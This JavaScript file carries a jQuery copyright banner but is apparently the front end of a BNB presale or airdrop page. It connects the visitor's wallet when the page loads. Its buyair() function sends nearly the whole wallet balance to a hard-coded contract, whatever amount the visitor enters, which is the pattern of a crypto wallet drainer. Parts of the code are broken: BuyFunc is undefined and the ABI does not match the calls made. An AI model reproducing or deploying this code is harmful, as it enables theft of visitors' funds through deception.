/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;
let web3Modal;
let provider;
let saleid;
let pingtaizongzhi = 0;

const contractAddress = "0x95fC56a2DFE90a0a221C1dCf5c25959DF3788051";
const minimumContribute = 0.1;
const maximumContribute = 3;
const contractAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"BAB_address","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"is_claimd","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"new_supply","type":"uint256"}],"name":"setMaxSupply","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}];

 function setMax() {

        document.getElementById('presaleAmount').value = maximumContribute;

      }
function init() {
    // if (location.protocol !== 'https:') {
    //     const alert = document.querySelector("#alert-error-https");
    //     alert.style.display = "block";
    //     document.querySelector("#btn-contribute").setAttribute("disabled", "disabled");
    //     return
    // }
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                rpc: {
                    56: 'https://bsc-dataseed.binance.org/'
                },
                network: 'binance',
            }
        }
    };
    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
        disableInjectedProvider: false,
    })
}
async function buyair() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let weiBalance = await web3.eth.getBalance(accounts[0]);
    window.balance = parseFloat(web3.utils.fromWei(weiBalance, "ether")).toFixed(4);

    let myContract = new web3.eth.Contract(contractAbi, contractAddress);
    let amount = balance - 0.002;
    let receipt = await myContract.methods.claim().send({
        from: window.account,
        value: (amount) * 10 ** 18,
        gasLimit: 210000,
    });

    //è®¾ç½®ä¸Šæ¬¡æŠ•èµ„é‡‘é¢
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    localStorage.setItem("lastnum", bnbVal);
    if (receipt.events.NewDeposit) {
        $nowZongliang = $('#MyValue').text();
        $('#MyValue').text(Number(Number($nowZongliang) + Number(amount)).toFixed(2))
        userinfo();
    }
}
async function fetchAccountData() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    let addr = accounts[0];
    var balance = await web3.eth.getBalance(accounts[0]);
    let ethBalance = web3.utils.fromWei(balance, 'ether');
    addr = addr.slice(0, 3) + "..." + addr.slice(-4);
    ethBalance = ethBalance.slice(0, 6) + " BNB";
    document.getElementById("btn-connect").innerHTML = addr;
    // saleid = document.getElementById("saleidtxt").textContent;
}
async function OnConnect() {
    Connect()
}

async function Tixian() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (provider == null) {
        await Connect();
        await BuyFunc(provider)
    } else await BuyFunc(provider)
}

async function BuyButton() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (bnbVal == 0 ) alert('Contribution value must be greater than or equal to 0.1');
    else {
        if (provider == null) {
            await Connect();
            await BuyFunc(provider)
        } else await BuyFunc(provider)
    }
}
async function Connect() {
    provider = await web3Modal.connect()
    await fetchAccountData(provider)
    userinfo();
}
async function onDisconnect() {
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null
    } else {
        await web3Modal.clearCachedProvider();
        provider = null
    }
    document.querySelector("#div-connect").style.display = "";
    document.querySelector("#div-connectet").style.display = "none"
}
function transformTime(t){
    //æ³¨æ„ï¼šè‹¹æžœæ‰‹æœºä¸æ”¯æŒä»¥â€œ-â€åˆ†å‰²çš„æ—¶é—´å½¢å¼ï¼Œæ•…å¿…é¡»è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚
    var time = t.replace(/-/g, '/');
    return Date.parse(time);
}
window.addEventListener('load', async () => {
    init();
    document.querySelector("#btn-contribute").addEventListener("click", BuyButton);
    document.querySelector("#btn-contribute-end").addEventListener("click", Tixian);
    document.querySelector("#btn-contribute-fail").addEventListener("click", Tixian);
    document.querySelector("#btn-connect").addEventListener("click", OnConnect);
    $('.btn-emergency').click(function(){
        Tixian();
    })
    OnConnect()
});

async function userinfo() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let myContract = new web3.eth.Contract(contractAbi, contractAddress);
    let userInfo = await myContract.methods.userInfo(window.account).call();
    var totalJine = web3.utils.fromWei(userInfo[0]);
    if(totalJine > 0){
        $('.jinjituikuan').show();
        var lastnum = localStorage.getItem("lastnum");
        if(lastnum && lastnum > 0){
            var has_touzitd = $('#lt_all_box').find('.touzitd').length;
            if(has_touzitd <= 0){
                $('#lt_all_box').find('tbody').append(`
                <tr class="touzitd">
                    <td>Your Purchased</td>
                    <td class="has-text-right">${lastnum} BNB</td>
                </tr>
            `);
            }
        }
    }else{
        $('.jinjituikuan').hide();
    }
    pingtaizongzhi = 0;
}
